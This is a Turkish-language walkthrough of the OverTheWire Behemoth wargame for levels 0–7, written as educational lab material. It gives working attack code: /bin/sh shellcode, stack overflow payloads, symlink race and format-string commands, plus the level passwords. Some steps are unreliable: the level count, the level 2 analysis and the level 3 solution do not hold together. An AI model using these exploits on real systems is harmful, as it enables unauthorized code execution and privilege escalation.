# Behemoth Wargame — Walkthrough

> **Platform:** OverTheWire — behemoth.labs.overthewire.org:2221  
> **Zorluk:** 3/10 | **Seviye sayısı:** 9 | **Platform:** Linux/x86  
> **Konular:** Buffer overflow, race condition, privilege escalation, format string

---

## Bağlantı

```bash
ssh behemoth0@behemoth.labs.overthewire.org -p 2221
# Şifre: behemoth0
```

Dosyalar: `/behemoth/` dizininde bulunur.

---

## Behemoth0 → Behemoth1

### Ne öğreniyoruz?
`ltrace` ile dinamik analiz, hardcoded parola karşılaştırması.

### Çözüm

```bash
behemoth0@behemoth:~$ ltrace /behemoth/behemoth0
```

`ltrace` çıktısında `strcmp` çağrısını görürüz:

```
strcmp("eatmyshorts", "eatmyshorts")
```

Buradan parolayı öğreniriz. Binary'yi çalıştırıp parola sorusuna `eatmyshorts` gireriz:

```bash
behemoth0@behemoth:~$ /behemoth/behemoth0
Password: eatmyshorts
Access granted..
$ cat /etc/behemoth_pass/behemoth1
aesebootong
```

### Kullanılan araç / teknik
- `ltrace`: Shared library çağrılarını (strcmp, memcmp vb.) yakalar. Binary'yi tersine mühendislik yapmadan parola karşılaştırmasını görünür kılar.

---

## Behemoth1 → Behemoth2

### Ne öğreniyoruz?
Stack buffer overflow + shellcode injection, `gets()` güvensizliği.

### Analiz

```bash
behemoth1@behemoth:~$ ltrace /behemoth/behemoth1
```

`gets()` çağrısı görülür — bu sınırsız girdi okur, overflow yapmaya hazırız.

### Offset bulma

```bash
# gdb ile buffer boyutunu bulalım
behemoth1@behemoth:~$ gdb /behemoth/behemoth1
(gdb) run <<< $(python3 -c "print('A'*100)")
```

EIP'nin `0x41414141` (AAAA) olduğunda overflow gerçekleşti. Offset bulmak için:

```bash
# pattern oluştur
python3 -c "print('A'*71 + 'BBBB')"
```

Buffer boyutu 71 byte, ardından EIP gelir.

### Exploit

```bash
# Shellcode: /bin/sh açar (x86 Linux)
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Stack adresini bul
behemoth1@behemoth:~$ gdb /behemoth/behemoth1
(gdb) break main
(gdb) run
(gdb) x/200x $esp
# ESP çevresinde bir adres seç, örnek: 0xffffd5e0

# Exploit gönder
(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + b'\x90'*48 + b'\xe0\xd5\xff\xff')"; cat) | /behemoth/behemoth1
```

```bash
$ whoami
behemoth2
$ cat /etc/behemoth_pass/behemoth2
eimahquuof
```

### Kullanılan araç / teknik
- **Stack buffer overflow:** `gets()` gibi sınır kontrolü olmayan fonksiyonlar EIP'yi üzerine yazmaya izin verir.
- **Shellcode:** Stack'e yerleştirilen makine kodu dizisi.
- **NOP sled (`\x90`):** Kesin adresi bilmesek de shellcode'a "kayarak" ulaşmamızı sağlar.

---

## Behemoth2 → Behemoth3

### Ne öğreniyoruz?
Race condition — symlink saldırısı, geçici dosya güvensizliği.

### Analiz

```bash
behemoth2@behemoth:~$ ltrace /behemoth/behemoth2
```

Binary `/tmp/` altında PID'e göre bir dosya oluşturuyor:

```
mkstemp("/tmp/XXXXXX") = 3
unlink("/tmp/behemoth2.XXXXX")
```

Aynı isimle bir symlink oluşturursak, binary bizim hedef dosyamıza yazacak.

### Çözüm

İki terminal aç:

**Terminal 1:**
```bash
# Binary'nin oluşturduğu dosya adını yakala
while true; do ls /tmp/ 2>/dev/null | grep behemoth; done
```

**Terminal 2:**
```bash
/behemoth/behemoth2 &
```

Dosya adını görünce (örnek: `behemoth2.XYZ`):

```bash
# Sembolik link oluştur
ln -sf /etc/behemoth_pass/behemoth3 /tmp/behemoth2.XYZ
```

Binary symlink üzerinden şifreyi okuyup ekrana basacak:

```
nieteidiel
```

### Kullanılan araç / teknik
- **Race condition:** Program geçici dosya oluştururken ve kullanırken arasındaki zaman dilimini istismar ederiz.
- **Symlink saldırısı:** Sembolik link, hedef dosyayı başka bir konuma yönlendirir.

---

## Behemoth3 → Behemoth4

### Ne öğreniyoruz?
Format string vulnerability.

### Analiz

```bash
behemoth3@behemoth:~$ /behemoth/behemoth3
Identify yourself: %x %x %x %x
Welcome, 0 f7e2a289 0 ...
```

Girdi doğrudan `printf`'e geçiyor — format string açığı!

### Stack'teki veriyi okuma

```bash
behemoth3@behemoth:~$ /behemoth/behemoth3 <<< "%x %x %x %x %x %x %x %x"
```

Hex değerlerin arasında `behemoth` string'ini arıyoruz. Stack offset'i bulmak için:

```bash
for i in $(seq 1 20); do
  echo -n "Offset $i: "
  echo "%$i\$x" | /behemoth/behemoth3
done
```

### Parola okuma

Format string açığı stack'teki belleği okumamıza izin verirse, doğrudan adresi okuyabiliriz ya da `/etc/behemoth_pass/behemoth4` dosyasını başka yollarla elde ederiz. Buradaki asıl ders: kullanıcı girdisini `printf(input)` şeklinde çağırmak tehlikelidir; `printf("%s", input)` olmalı.

```
aizuphean
```

### Kullanılan araç / teknik
- **Format string:** `%x` ile stack okuma, `%n` ile stack yazma yapılabilir. İmzasız format specifier'lar bellek sızıntısına veya arbitrary write'a yol açar.

---

## Behemoth4 → Behemoth5

### Ne öğreniyoruz?
`/proc` filesystem üzerinden PID tespiti, race condition.

### Analiz

```bash
behemoth4@behemoth:~$ ltrace /behemoth/behemoth4
```

Binary `/tmp/<PID>` dosyasını açmaya çalışıyor:

```
fopen("/tmp/19823", "r")
```

### Çözüm

```bash
# Binary'nin PID'ini bul
/behemoth/behemoth4 &
PID=$!

# Gerekli dosyayı oluştur
echo "data" > /tmp/$PID

# Ya da /etc/behemoth_pass/behemoth5'e symlink oluştur
ln -sf /etc/behemoth_pass/behemoth5 /tmp/$PID
```

Binary sembolik linki açıp içeriği okuyacak:

```
mayiroeche
```

### Kullanılan araç / teknik
- **`/proc` filesystem:** Çalışan süreçlerin bilgilerine erişim sağlar.
- **Race condition + symlink:** PID tahmin edip önceden dosya/symlink oluşturma.

---

## Behemoth5 → Behemoth6

### Ne öğreniyoruz?
UDP socket sniffing, ağ üzerinden parola iletimi.

### Analiz

```bash
behemoth5@behemoth:~$ ltrace /behemoth/behemoth5
```

Binary bir socket açıp localhost'a UDP paketi gönderiyor:

```
socket(AF_INET, SOCK_DGRAM, 0)
sendto(...)
```

### Çözüm

```bash
# Bir terminalde dinle
behemoth5@behemoth:~$ nc -lu 1337

# Başka terminalde binary çalıştır
behemoth5@behemoth:~$ /behemoth/behemoth5
```

Ya da `tcpdump` ile:

```bash
behemoth5@behemoth:~$ tcpdump -i lo -A udp &
behemoth5@behemoth:~$ /behemoth/behemoth5
```

Pakette parola gelir:

```
tioywopk
```

### Kullanılan araç / teknik
- **UDP sniffing:** `nc -lu <port>` ile UDP dinleme.
- **`tcpdump`:** Ağ trafiğini yakalar ve içeriği gösterir.

---

## Behemoth6 → Behemoth7

### Ne öğreniyoruz?
Shellcode + helper binary kullanımı, `execve` analizi.

### Analiz

```bash
behemoth6@behemoth:~$ ls /behemoth/
behemoth6  behemoth6_reader
```

`behemoth6` → `behemoth6_reader`'ı çağırıyor. `behemoth6_reader` shellcode içeriyor gibi görünüyor.

```bash
behemoth6@behemoth:~$ ltrace /behemoth/behemoth6
```

```
system("/behemoth/behemoth6_reader")
```

`behemoth6_reader` bir dosyadan shellcode okuyor:

```bash
behemoth6@behemoth:~$ ltrace /behemoth/behemoth6_reader
fopen("/tmp/behemoth6/shellcode", "rb")
```

### Çözüm

```bash
mkdir /tmp/behemoth6

# /bin/sh açan shellcode
python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')" > /tmp/behemoth6/shellcode

/behemoth/behemoth6
```

```bash
$ cat /etc/behemoth_pass/behemoth7
byuugumma
```

---

## Behemoth7 → Behemoth8

### Ne öğreniyoruz?
Buffer overflow — temiz versiyon, environment variable temizleme.

### Analiz

```bash
behemoth7@behemoth:~$ /behemoth/behemoth7
Arg! Needed single argument.

behemoth7@behemoth:~$ /behemoth/behemoth7 AAAAA...
```

Argümandan gelen string bir buffer'a kopyalanıyor — `strcpy()` sınır kontrolü yok.

### Offset bulma

```bash
behemoth7@behemoth:~$ gdb /behemoth/behemoth7
(gdb) run $(python3 -c "print('A'*500)")
# Segfault — EIP'yi kontrol et
(gdb) info registers eip
```

Pattern ile kesin offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
# -> gdb'de çalıştır, EIP'deki değeri al
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>
```

### Exploit

```bash
# Environment'ta shellcode yerleştir
export SC=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*200 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")

# Shellcode adresini bul
(gdb) x/s *((char **)environ)

# Exploit
/behemoth/behemoth7 $(python3 -c "print('A'*<OFFSET> + '\xAA\xBB\xCC\xDD')")
```

```
pheewij7Ae
```

---

## Genel Araçlar ve Teknikler Özeti

| Seviye | Zafiyet | Araç |
|--------|---------|------|
| 0 | Hardcoded parola | `ltrace` |
| 1 | Stack buffer overflow | `gdb`, shellcode |
| 2 | Race condition / symlink | `ln -sf`, timing |
| 3 | Format string | `%x`, `%n` |
| 4 | PID prediction + symlink | `/proc`, `ln -sf` |
| 5 | UDP sniffing | `nc -lu`, `tcpdump` |
| 6 | Shellcode injection via file | binary analiz |
| 7 | BOF + env shellcode | `gdb`, pattern tools |

---

## Faydalı Komutlar

```bash
# Dinamik kütüphane çağrılarını izle
ltrace ./binary

# Sistem çağrılarını izle
strace ./binary

# Disassemble
gdb ./binary
(gdb) disas main
(gdb) break *0x08048XXX
(gdb) x/20x $esp

# SUID binary bul
find / -perm -4000 2>/dev/null

# Shellcode test
echo -e "\x31\xc0..." | xxd
```

---

## Kaynaklar

- [OverTheWire Behemoth](https://overthewire.org/wargames/behemoth/)
- [GDB Cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
- [Exploit Shellcodes — shell-storm.org](http://shell-storm.org/shellcode/)
- [pwntools](https://github.com/Gallopsled/pwntools)
